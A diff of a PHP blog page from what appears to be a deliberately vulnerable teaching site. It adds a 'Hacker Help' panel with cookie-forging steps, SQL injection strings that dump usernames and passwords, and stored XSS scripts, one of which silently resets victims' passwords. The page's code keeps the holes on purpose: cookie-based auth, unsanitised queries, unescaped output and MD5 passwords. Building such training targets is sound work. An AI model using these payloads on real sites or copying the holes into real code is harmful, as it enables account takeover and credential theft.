@@ -9,13 +9,13 @@ Step 5 Now that we have the  hasshed password we can use hashkiller.co.uk/Cracke
 
 
 */
-include 'sql.php';
+include '../sql.php';
 header("X-XSS-Protection: 0");
 if(isset($_POST['logout'])){
     unset($_COOKIE['username']);
     setcookie('username', '', time() - 3600);
 }
-include "header.html";
+include "../resources/header.html";
 
 ?>
   <header class="bg-primary text-white">
@@ -38,7 +38,7 @@ if(isset($_POST['username'])){
         if($fullarray[0]['password'] == md5($_POST['password'])){
             $login = True;
             setcookie("username",$_POST['username']);
-            header("Location: blog.php");
+            header("Location: index.php");
         }else{
             echo "<h3 class='text-danger text-center'>Passwords don't match</h3>";
         }
@@ -78,7 +78,7 @@ if(isset($_COOKIE['username']) || $login == True){
     echo "<span class='text-primary font-weight-bold'>Username: </span><span id='accountinfousername'>" . $fullarray['username'] . "</span><br>";
     echo "<span class='text-primary font-weight-bold'>Email: </span><span>" . $fullarray['email'] . "</span><br>";
     echo '<div class="form-group">
-            <form method = "post" action="blog.php">
+            <form method = "post" action="index.php">
               <label for "resetpassword" class="text-primary font-weight-bold">Reset Password:</label><br>
               <input id="resetpassword" type="text" name="resetpassword" class="form-control">
               <br>
@@ -86,7 +86,7 @@ if(isset($_COOKIE['username']) || $login == True){
             </form>
           </div>';
           echo '<div class="form-group">
-          <form method = "post" action="blog.php">
+          <form method = "post" action="index.php">
             <input id="logout" type="hidden" name="logout" value="true">
             <button type="submit" id="logoutbutton" class="btn btn-primary">Logout</button>
           </form>
@@ -95,7 +95,7 @@ if(isset($_COOKIE['username']) || $login == True){
 }else{
     echo '<div class="form-group">
             <h2> Please Login </h2>
-            <form method = "post" action="blog.php">
+            <form method = "post" action="index.php">
               <label for "username">Username:</label><br>
               <input id="username" type="text" name="username" class="form-control">
               <label for "password">Password:</label><br>
@@ -121,7 +121,7 @@ if(isset($_POST['blogtitle'])){
 
     if ($connection->query($sql) === TRUE) {
         echo "<p class='text-success'>New blog post created successfully.</p>";
-        header("Location: blog.php");
+        header("Location: index.php");
     } else {
         echo "<p class='text-danger'>Error: " . $sql . "<br>" . $connection->error . "</p>";
     }
@@ -131,7 +131,7 @@ if(isset($_POST['blogtitle'])){
 if(isset($_COOKIE['username']) || $login == True){
 echo'<div class="form-group">
             <h2> Post Your Blog</h2>
-            <form method = "post" action="blog.php">
+            <form method = "post" action="index.php">
               <label for "blogtitle">Title:</label><br>
               <input id="blogtitle" type="text" name="blogtitle" class="form-control">
               <label for "blogpost">Post:</label><br>
@@ -149,7 +149,7 @@ echo'<div class="form-group">
 </div>
 <div class="container">
       <div class="row">
-        <div class="col-lg-10 ">
+        <div class="col-lg-6 ">
 <?php
 //Show current blog posts
     $sql = $connection->query("SELECT * FROM blogposts ORDER BY ID DESC");
@@ -162,11 +162,69 @@ echo'<div class="form-group">
         echo("<p>" . $blogpost['blogpost'] . "</p>");
     }
 ?>
-</div>
-</div>
+        </div>
+        <div class="col-lg-6 ">
+            <hr>
+            <button class='btn btn-primary' data-toggle="collapse" data-target="#hackerhelp">Click For Hacker Help</button>
+            <div id="hackerhelp" class="collapse">
+                </br>
+                <p class='text-primary font-weight-bold'>Cookie Manipulation</p>
+                <p class='text-primary'>When the user logs in a cookie is set with the users username. This can be modified to be any user, thus becoming that user.
+                    Try using a chrome extension like EditThisCookie to make it easy and change the user to 'admin' or another user in the comments.</p>
+                <p class='text-primary font-weight-bold'>SQL Injection Queries</p>
+                <p class='text-primary'>The SQL can be injected via the username in the cookie.</p>
+                <p class='text-primary'>Test if sql injection works</p>
+                <p>mstubenberg' OR '1' = '1</p>
+                <p class='text-primary'>Replace password for user</p>
+                <p>fakeuser' UNION ALL SELECT "test" as test,password FROM users WHERE username = 'attorney1</p>
+                <p class='text-primary'>Get all the users information using ID</p>
+                <p>fakeuser' UNION ALL SELECT username,password FROM users WHERE ID = '2</p>
+                <p class='text-primary font-weight-bold'>JavaScript Injection</p>
+                <p class='text-primary'>You can add javascript directly into the text box for a post which is then executed by the users browser.<p>
+
+                <p class='text-primary'>Enter the script below into a post and check the console to see if "It Worked" printed. This means JavaScript injection worked!</p>
+                <code>
+                &lt;script&gt;
+                console.log("It worked!");
+                &lt;/script&gt;
+                </code>
+                </br>
+                </br>
+                <p class='text-primary'>This script will pop up an alert window letting everyone know that you're a great hacker.</p>
+                <code>
+                &lt;script&gt;
+                alert("The site has been hacked!");
+                &lt;/script&gt;
+                </code>
+                </br>
+                </br>
+                <p class='text-primary'>Script to change the password of the user and then log them out unless they are the user "hackerman"
+                Note: This one should be dropped as an example because it then prohibits any of the audience from playing with the site.</p>
+                <p class='text-danger font-weight-bold'>Do not use this during a live demo</p>
+                <code>
+                    &lt;script&gt;
+                    setTimeout(function(){
+                        console.log("It worked");
+                        if($("#accountinfousername").text() != "hackerman"){
+                                if($("#logoutbutton").length > 0 && $("#resetpasswordsuccess").length == 0){
+                                    $("#resetpassword").val("pa$$word");
+                                    $("#resetpasswordbutton").click();
+                                }else if($("#resetpasswordsuccess").length > 0){
+                                    $("#logoutbutton").click();
+                                }else{
+                                    console.log("Waiting for user to login");
+                                }
+                            }
+
+                        },1000); 
+                    &lt;/script&gt;
+                </code>
+            </div>
+        </div>
+    </div>
 </div>
 <?php
-    require "footer.html";
+    require "../resources/footer.html";
     /*
     Great community!
     <script>
